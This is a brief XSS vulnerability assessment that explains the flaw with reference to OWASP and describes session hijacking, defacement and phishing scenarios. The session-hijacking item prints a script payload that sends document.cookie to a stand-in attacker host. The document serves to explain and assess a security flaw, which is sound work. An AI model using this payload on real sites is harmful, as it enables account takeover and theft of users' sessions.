# XSS Vulnerability Assessment

## Vulnerability Type
The application is vulnerable to **Cross-Site Scripting (XSS)**. According to **OWASP** (Open Worldwide Application Security Project), XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute malicious scripts in the victim's browser.

## Exploitation Scenarios
1. **Session Hijacking (Cookie Theft):** 
   An attacker can inject a payload that sends the victim's session cookie to a server controlled by the attacker. Example: `<script>fetch('http://attacker.com/?cookie=' + document.cookie)</script>`. This allows the attacker to take over the victim's account.

2. **Website Defacement & Phishing:**
   The attacker can inject HTML/JS to modify the visual appearance of the page or present a fake login form. When users try to log in, their credentials are sent directly to the attacker instead of the legitimate server.
